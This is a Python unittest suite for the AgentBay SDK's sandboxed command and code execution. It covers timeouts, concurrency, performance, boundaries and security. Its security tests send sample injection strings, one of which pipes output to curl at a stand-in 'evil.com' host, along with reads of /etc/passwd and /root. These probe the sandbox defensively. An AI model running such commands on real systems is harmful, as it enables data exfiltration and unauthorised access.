import os
import unittest
import time
import concurrent.futures
import threading

from agentbay import AgentBay
from agentbay.command.command import CommandResult
from agentbay.code.code import CodeExecutionResult
from agentbay.session_params import CreateSessionParams

class TestCommandComprehensive(unittest.TestCase):
    """
    Command Comprehensive Tests

    This test suite covers comprehensive command execution operations including:
    1. ExecuteCommand Function Tests
    2. RunCode Function Tests
    3. Concurrent Execution Tests
    4. Performance Tests
    5. Security Tests
    6. Boundary Tests
    7. Data Integrity Tests
    """

    @classmethod
    def setUpClass(cls):
        """Set up test environment before all tests."""
        # Get API key from environment
        cls.api_key = os.getenv("AGENTBAY_API_KEY")
        if not cls.api_key:
            raise unittest.SkipTest("AGENTBAY_API_KEY environment variable not set")

        # Initialize AgentBay client
        cls.agent_bay = AgentBay(cls.api_key)

        # Create a session with code_latest image to support both command and code execution
        print("Creating a new session for Command comprehensive testing...")
        params = CreateSessionParams(
            image_id="code_latest",
        )
        result = cls.agent_bay.create(params)
        if not result.success or not result.session:
            raise unittest.SkipTest("Failed to create session")

        cls.session = result.session
        cls.command = cls.session.command
        cls.code = cls.session.code
        print(f"Session created with ID: {cls.session.session_id}")

    @classmethod
    def tearDownClass(cls):
        """Clean up test environment after all tests."""
        print("Cleaning up: Deleting the session...")
        if hasattr(cls, "session"):
            try:
                result = cls.agent_bay.delete(cls.session)
                if result.success:
                    print("Session successfully deleted")
                else:
                    print(f"Warning: Error deleting session: {result.error_message}")
            except Exception as e:
                print(f"Warning: Error deleting session: {e}")

    # 1. ExecuteCommand Function Tests
    def test_1_1_tc_cmd_001_basic_shell_command_execution(self):
        """TC-CMD-001: Basic Shell Command Execution - should successfully execute basic shell commands"""
        # Prerequisites: AgentBay instance created and connected normally, Session established successfully, Command object initialized
        # Test objective: Verify correct execution of basic shell commands

        start_time = time.time()
        result = self.command.execute_command("echo 'Hello World'", 1000)
        execution_time = (time.time() - start_time) * 1000

        # Verification points
        self.assertIsInstance(result, CommandResult)
        self.assertTrue(result.success)
        self.assertIn("Hello World", result.output)
        self.assertIsNotNone(result.request_id)
        self.assertNotEqual(result.request_id, "")
        self.assertGreater(execution_time, 0)  # Execution time should be greater than 0

        print(f"TC-CMD-001 execution time: {execution_time:.2f}ms")

    def test_1_2_tc_cmd_002_file_operation_command_execution(self):
        """TC-CMD-002: File Operation Command Execution - should execute file creation, reading, and deletion commands"""
        # Prerequisites: Session environment prepared, file system access permissions available
        # Test objective: Verify execution of file create, read, delete commands

        test_content = "test content"
        test_file = "/tmp/test_file.txt"

        # Step 1: Execute create file command
        create_result = self.command.execute_command(f"echo '{test_content}' > {test_file}")
        self.assertTrue(create_result.success)

        # Step 2: Execute read file command
        read_result = self.command.execute_command(f"cat {test_file}")
        self.assertTrue(read_result.success)
        self.assertEqual(read_result.output.strip(), test_content)

        # Step 3: Execute delete file command
        delete_result = self.command.execute_command(f"rm {test_file}")
        self.assertTrue(delete_result.success)

        # Step 4: Verify file deletion
        verify_result = self.command.execute_command(f"ls {test_file}")
        self.assertFalse(verify_result.success)  # File not existing should return error

    def test_1_3_tc_cmd_003_timeout_mechanism_verification(self):
        """TC-CMD-003: Timeout Mechanism Verification - should verify command execution timeout control mechanism"""
        # Prerequisites: Session environment prepared, system supports sleep command
        # Test objective: Verify command execution timeout control mechanism

        timeout_ms = 1000
        start_time = time.time()

        result = self.command.execute_command("sleep 5", timeout_ms)
        actual_time = (time.time() - start_time) * 1000

        # Verification points
        self.assertFalse(result.success)
        self.assertLess(actual_time, 6000)  # Should be interrupted within 5 seconds
        self.assertGreater(actual_time, timeout_ms * 0.8)  # Close to timeout time

        print(f"TC-CMD-003 actual execution time: {actual_time:.2f}ms, timeout: {timeout_ms}ms")

    def test_1_4_tc_cmd_004_error_command_handling(self):
        """TC-CMD-004: Error Command Handling - should handle invalid command error processing"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify error handling mechanism for invalid commands

        result = self.command.execute_command("invalid_command_xyz")

        # Verification points
        self.assertFalse(result.success)
        self.assertIsNotNone(result.error_message)
        self.assertNotEqual(result.error_message, "")

        print(f"TC-CMD-004 error message: {result.error_message}")

    # 2. RunCode Function Tests
    def test_2_1_tc_code_001_python_code_execution(self):
        """TC-CODE-001: Python Code Execution - should verify correct execution of Python code"""
        # Prerequisites: Session environment prepared, Python runtime environment available
        # Test objective: Verify correct execution of Python code

        python_code = "print('Hello from Python')"
        result = self.code.run_code(python_code, "python", 60)

        # Verification points
        self.assertIsInstance(result, CodeExecutionResult)
        self.assertTrue(result.success)
        self.assertIn("Hello from Python", result.result)
        self.assertIsNotNone(result.request_id)

        print(f"TC-CODE-001 result: {result.result}")

    def test_2_2_tc_code_002_javascript_code_execution(self):
        """TC-CODE-002: JavaScript Code Execution - should verify correct execution of JavaScript code"""
        # Prerequisites: Session environment prepared, JavaScript runtime environment available
        # Test objective: Verify correct execution of JavaScript code

        js_code = "console.log('Hello from JavaScript')"
        result = self.code.run_code(js_code, "javascript", 60)

        # Verification points
        self.assertTrue(result.success)
        self.assertIn("Hello from JavaScript", result.result)
        self.assertIsNotNone(result.request_id)

        print(f"TC-CODE-002 result: {result.result}")

    def test_2_3_tc_code_003_complex_python_code_execution(self):
        """TC-CODE-003: Complex Python Code Execution - should verify execution of Python code with data processing"""
        # Prerequisites: Session environment prepared, Python standard library available
        # Test objective: Verify execution of Python code with data processing

        complex_python_code = """
import json
data = [1, 2, 3, 4, 5]
result = sum(data)
print(json.dumps({"sum": result, "count": len(data)}))
        """.strip()

        result = self.code.run_code(complex_python_code, "python", 300)

        # Verification points
        self.assertTrue(result.success)

        # Parse JSON output
        import re
        import json
        json_match = re.search(r'\{.*\}', result.result)
        self.assertIsNotNone(json_match)

        if json_match:
            parsed_result = json.loads(json_match.group(0))
            self.assertEqual(parsed_result["sum"], 15)
            self.assertEqual(parsed_result["count"], 5)

        print(f"TC-CODE-003 result: {result.result}")

    def test_2_4_tc_code_004_code_execution_timeout_control(self):
        """TC-CODE-004: Code Execution Timeout Control - should verify code execution timeout control mechanism"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify code execution timeout control mechanism

        long_running_code = "import time; time.sleep(10)"
        timeout_seconds = 5
        start_time = time.time()

        result = self.code.run_code(long_running_code, "python", timeout_seconds)
        actual_time = (time.time() - start_time) * 1000

        # Verification points
        self.assertFalse(result.success)
        self.assertLess(actual_time, 15000)  # Should complete within 15 seconds (including network delay)
        self.assertGreater(actual_time, timeout_seconds * 1000 * 0.5)  # Close to timeout time

        print(f"TC-CODE-004 actual time: {actual_time:.2f}ms, timeout: {timeout_seconds}s")

    def test_2_5_tc_code_005_unsupported_language_handling(self):
        """TC-CODE-005: Unsupported Language Handling - should handle unsupported language error processing"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify error handling for unsupported languages

        result = self.code.run_code('System.out.println("Hello");', "java", 60)

        # Verification points
        self.assertFalse(result.success)
        self.assertIsNotNone(result.error_message)
        self.assertIn("language", result.error_message.lower())

        print(f"TC-CODE-005 error: {result.error_message}")

    def test_2_6_tc_code_006_code_syntax_error_handling(self):
        """TC-CODE-006: Code Syntax Error Handling - should handle syntax error code processing"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify handling of syntax error code

        syntax_error_code = "print('unclosed string"
        result = self.code.run_code(syntax_error_code, "python", 60)

        # Verification points
        self.assertFalse(result.success)
        self.assertIsNotNone(result.error_message)
        self.assertTrue(
            "syntax" in result.error_message.lower() or
            "error" in result.error_message.lower()
        )

        print(f"TC-CODE-006 syntax error: {result.error_message}")

    # 3. Concurrent Execution Tests
    def test_3_1_tc_concurrent_001_concurrent_command_execution(self):
        """TC-CONCURRENT-001: Concurrent Command Execution - should verify concurrent command execution capability"""
        # Prerequisites: Multiple Sessions established, system supports concurrent operations
        # Test objective: Verify concurrent execution capability of multiple commands

        # Create multiple sessions (using default image, command execution doesn't need code_latest)
        sessions = []
        agent_bays = []

        try:
            for i in range(3):
                ab = AgentBay(self.api_key)
                params = CreateSessionParams()
                session_result = ab.create(params)
                self.assertTrue(session_result.success)

                agent_bays.append(ab)
                sessions.append(session_result.session)

            # Execute different commands concurrently
            commands = [
                "echo 'Command 1'",
                "echo 'Command 2'",
                "echo 'Command 3'"
            ]

            start_time = time.time()

            def execute_command_task(session, command):
                return session.command.execute_command(command)

            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                futures = [
                    executor.submit(execute_command_task, sessions[i], commands[i])
                    for i in range(3)
                ]
                results = [future.result() for future in concurrent.futures.as_completed(futures)]

            concurrent_time = (time.time() - start_time) * 1000

            # Verification points
            for i, result in enumerate(results):
                self.assertTrue(result.success)
                # Check if output contains corresponding command result
                found_match = False
                for j in range(1, 4):
                    if f"Command {j}" in result.output:
                        found_match = True
                        break
                self.assertTrue(found_match, f"Result {i} should contain a command output")

            print(f"TC-CONCURRENT-001 concurrent execution time: {concurrent_time:.2f}ms")

        finally:
            # Clean up sessions
            for i in range(len(sessions)):
                try:
                    agent_bays[i].delete(sessions[i])
                except Exception as e:
                    print(f"Warning: Error deleting session {i}: {e}")

    def test_3_2_tc_concurrent_002_mixed_code_concurrent_execution(self):
        """TC-CONCURRENT-002: Mixed Code Concurrent Execution - should verify concurrent execution of different language codes"""
        # Prerequisites: Session established, both Python and JavaScript environments available
        # Test objective: Verify concurrent execution of different language codes

        python_code = "print('Python result')"
        js_code = "console.log('JavaScript result')"

        start_time = time.time()

        def run_code_task(code, language):
            return self.code.run_code(code, language, 60)

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            python_future = executor.submit(run_code_task, python_code, "python")
            js_future = executor.submit(run_code_task, js_code, "javascript")

            python_result = python_future.result()
            js_result = js_future.result()

        concurrent_time = (time.time() - start_time) * 1000

        # Verification points
        self.assertTrue(python_result.success)
        self.assertTrue(js_result.success)
        self.assertIn("Python result", python_result.result)
        self.assertIn("JavaScript result", js_result.result)

        print(f"TC-CONCURRENT-002 mixed execution time: {concurrent_time:.2f}ms")

    # 4. Performance Tests
    def test_4_1_tc_perf_001_command_execution_performance_baseline(self):
        """TC-PERF-001: Command Execution Performance Baseline - should establish command execution performance baseline"""
        # Prerequisites: Stable test environment, no other high-load tasks
        # Test objective: Establish command execution performance baseline

        iterations = 10  # Reduce iterations to suit test environment
        execution_times = []
        success_count = 0

        for i in range(iterations):
            start_time = time.time()
            result = self.command.execute_command(f"echo 'Test {i}'")
            execution_time = (time.time() - start_time) * 1000

            execution_times.append(execution_time)
            if result.success:
                success_count += 1

        # Calculate statistics
        avg_time = sum(execution_times) / len(execution_times)
        max_time = max(execution_times)
        min_time = min(execution_times)
        sorted_times = sorted(execution_times)
        p99_time = sorted_times[int(0.99 * len(sorted_times))]

        # Verification points
        self.assertLess(avg_time, 5000)  # Adjust to 5 seconds to accommodate network delay
        self.assertLess(p99_time, 10000)  # 99% requests complete within 10 seconds
        self.assertGreaterEqual(success_count / iterations, 0.8)  # 80% success rate

        print(f"TC-PERF-001 Performance: Avg={avg_time:.2f}ms, Min={min_time:.2f}ms, "
              f"Max={max_time:.2f}ms, P99={p99_time:.2f}ms, Success={success_count}/{iterations}")

    def test_4_2_tc_perf_002_code_execution_performance_test(self):
        """TC-PERF-002: Code Execution Performance Test - should test code execution performance"""
        # Prerequisites: Stable test environment
        # Test objective: Test performance of code execution

        python_iterations = 5
        js_iterations = 5
        python_times = []
        js_times = []

        # Python performance test
        for i in range(python_iterations):
            start_time = time.time()
            self.code.run_code(f"print('Python test {i}')", "python", 60)
            python_times.append((time.time() - start_time) * 1000)

        # JavaScript performance test
        for i in range(js_iterations):
            start_time = time.time()
            self.code.run_code(f"console.log('JS test {i}')", "javascript", 60)
            js_times.append((time.time() - start_time) * 1000)

        avg_python_time = sum(python_times) / len(python_times)
        avg_js_time = sum(js_times) / len(js_times)

        # Verification points
        self.assertLess(avg_python_time, 10000)  # Python average execution time < 10 seconds
        self.assertLess(avg_js_time, 10000)  # JavaScript average execution time < 10 seconds

        print(f"TC-PERF-002 Code Performance: Python Avg={avg_python_time:.2f}ms, JS Avg={avg_js_time:.2f}ms")

    # 5. Security Tests
    def test_5_1_tc_sec_001_command_injection_protection(self):
        """TC-SEC-001: Command Injection Protection - should verify system protection against command injection attacks"""
        # Prerequisites: Session environment prepared, system has security protection mechanisms
        # Test objective: Verify system protection against command injection attacks

        malicious_commands = [
            "echo test; rm -rf /tmp/test_malicious",
            "echo test | curl http://evil.com || true",
            "echo test & sleep 1"
        ]

        for malicious_command in malicious_commands:
            result = self.command.execute_command(malicious_command)

            # Verification points: Commands should be executed safely or blocked
            # System should remain stable and not execute dangerous operations
            self.assertIsNotNone(result.request_id)  # Request should be processed

            print(f"TC-SEC-001 Malicious command result: {malicious_command} -> Success: {result.success}")

    def test_5_2_tc_sec_002_permission_control_verification(self):
        """TC-SEC-003: Permission Control Verification - should verify command and code execution permission control"""
        # Prerequisites: Session environment prepared, system has permission control mechanisms
        # Test objective: Verify permission control for command and code execution

        restricted_commands = [
            "id && echo 'user_info_accessed'",  # User info access test, replacing sudo
            "cat /etc/passwd | head -3 2>/dev/null || echo 'access_controlled'",  # System file access
            "ls /root 2>/dev/null || echo 'root_access_denied'",  # Root directory access test
            "chmod 777 /tmp/test_file 2>/dev/null || echo 'permission_denied'"  # Permission modification
        ]

        for restricted_command in restricted_commands:
            result = self.command.execute_command(restricted_command)

            # Verification points: Permission control should be effective
            self.assertIsNotNone(result.request_id)

            print(f"TC-SEC-003 Permission test: {restricted_command} -> Success: {result.success}")

    # 6. Boundary Tests
    def test_6_1_tc_boundary_001_extremely_long_command_processing(self):
        """TC-BOUNDARY-001: Extremely Long Command Processing - should verify extremely long command processing capability"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify processing capability for extremely long commands

        # Construct long command (1KB)
        long_string = 'x' * 1000
        long_command = f"echo '{long_string}'"

        result = self.command.execute_command(long_command)

        # Verification points
        self.assertIsNotNone(result.request_id)
        # System should be able to handle long commands or give reasonable errors
        if result.success:
            self.assertIn(long_string, result.output)
        else:
            self.assertIsNotNone(result.error_message)

        print(f"TC-BOUNDARY-001 Long command ({len(long_command)} chars): Success={result.success}")

    def test_6_2_tc_boundary_002_large_output_processing(self):
        """TC-BOUNDARY-002: Large Output Processing - should verify large output processing capability"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify processing capability for large output

        # Command that generates large output
        result = self.command.execute_command("seq 1 100")  # Output 1-100

        # Verification points
        self.assertIsNotNone(result.request_id)
        if result.success:
            self.assertGreater(len(result.output.split('\n')), 50)

        print(f"TC-BOUNDARY-002 Large output: Success={result.success}, Output length={len(result.output)}")

    def test_6_3_tc_boundary_003_special_character_processing(self):
        """TC-BOUNDARY-003: Special Character Processing - should verify special character and encoding processing"""
        # Prerequisites: Session environment prepared
        # Test objective: Verify processing of special characters and encoding

        special_chars = [
            "echo 'Special: !@#$%^&*()'",
            "echo 'Unicode: 你好世界 🌍'",
            "echo Quotes: 'double' and 'single'",
            "echo 'Newlines:\nand\ttabs'"
        ]

        for special_command in special_chars:
            result = self.command.execute_command(special_command)

            # Verification points
            self.assertIsNotNone(result.request_id)

            print(f"TC-BOUNDARY-003 Special chars: {special_command} -> Success={result.success}")

    # 7. Data Integrity Tests
    def test_7_1_maintain_command_execution_consistency(self):
        """7.1 Data Integrity Tests - should maintain command execution consistency"""
        # Verify consistency of command execution
        test_command = "echo 'consistency test'"
        iterations = 5
        results = []

        for i in range(iterations):
            result = self.command.execute_command(test_command)
            self.assertTrue(result.success)
            results.append(result.output.strip())

        # Verify all results should be consistent
        first_result = results[0]
        for result in results:
            self.assertEqual(result, first_result)

        print(f"Data integrity test: All {iterations} executions returned consistent results")

    def test_7_2_handle_session_state_correctly(self):
        """7.2 Data Integrity Tests - should handle session state correctly"""
        # Verify correct handling of session state
        self.assertIsNotNone(self.session.session_id)
        self.assertNotEqual(self.session.session_id, "")
        self.assertIsNotNone(self.command)
        self.assertIsNotNone(self.code)

        # Verify association between command object and session
        result = self.command.execute_command("echo 'session test'")
        self.assertTrue(result.success)
        self.assertIsNotNone(result.request_id)

        print(f"Session state test: SessionId={self.session.session_id}, Command available={self.command is not None}")

if __name__ == "__main__":
    unittest.main()
